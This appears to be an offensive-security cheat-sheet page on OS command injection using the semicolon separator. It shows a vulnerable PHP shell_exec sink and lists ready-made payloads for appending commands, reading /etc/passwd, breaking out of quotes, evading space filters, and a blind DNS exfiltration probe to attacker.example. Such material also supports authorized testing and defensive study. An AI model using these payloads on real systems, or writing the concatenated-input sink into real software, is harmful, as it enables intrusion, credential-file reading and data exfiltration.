---
title: "Sequential command chaining with the semicolon separator"
description: "Using ; to append commands that run unconditionally after an injected value reaches a shell, the simplest OS command injection primitive."
keywords:
  - command injection
  - command chaining
  - semicolon separator
  - sequential execution
  - shell injection
  - RCE
---

# Sequential execution (`;`)

The semicolon is the shell's plain command separator. In `sh`/`bash`, `a; b` runs `a`, waits for it to finish, then runs `b`—**regardless of whether `a` succeeded or failed**. When a user value is concatenated into a command that a shell interprets, a single `;` lets you terminate the intended command and append one of your own.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Executing commands without written authorization is unlawful.

## Mechanism

A typical sink concatenates input into a shell command:

```php
// host comes from an HTTP parameter
$out = shell_exec("ping -c 1 " . $host);
```

With `host = 127.0.0.1; id`, the shell sees two statements and runs both:

```
ping -c 1 127.0.0.1
id
```

The injected command runs as the application's service account. Unlike `&&`/`||`, the semicolon carries **no condition**: your command fires even when the preceding one errors out, which makes it the most reliable separator for a first probe when you don't know whether the intended command will complete.

## Payloads

Basic append, reflected context:

```
127.0.0.1; id
127.0.0.1; whoami
; cat /etc/passwd
```

Lead with your own terminator when the expected value may still execute and pollute the output, and add a trailing `;` to swallow whatever the application appends after your input:

```
; id ;
foo; id #        # comment out the tail on POSIX sh
```

A newline is also a statement separator inside `sh -c`, so a URL-encoded `%0a` substitutes for `;` when the literal character is stripped:

```
127.0.0.1%0aid
```

## Context handling

The semicolon only works where it is parsed as syntax. Inside quotes you must break out first:

```
# double quotes:  ping -c 1 "$host"
"; id; echo "
# single quotes:  sh -c 'ping ... '$host''
'; id; '
```

When spaces are filtered, pair `;` with `${IFS}` or brace expansion so the appended command still tokenizes:

```
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;{cat,/etc/passwd}
```

## Blind use

If output is not reflected, the semicolon still delivers a payload whose effect you observe out-of-band—a delay, a DNS hit, or a file written to a served path:

```
127.0.0.1; sleep 10
127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
```

## Platform note

On Windows `cmd.exe` the semicolon is **not** a command separator—use `&` instead (`127.0.0.1 & whoami`). In PowerShell, `;` does separate statements, so a host that spawns PowerShell accepts `127.0.0.1; whoami`.

## References

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
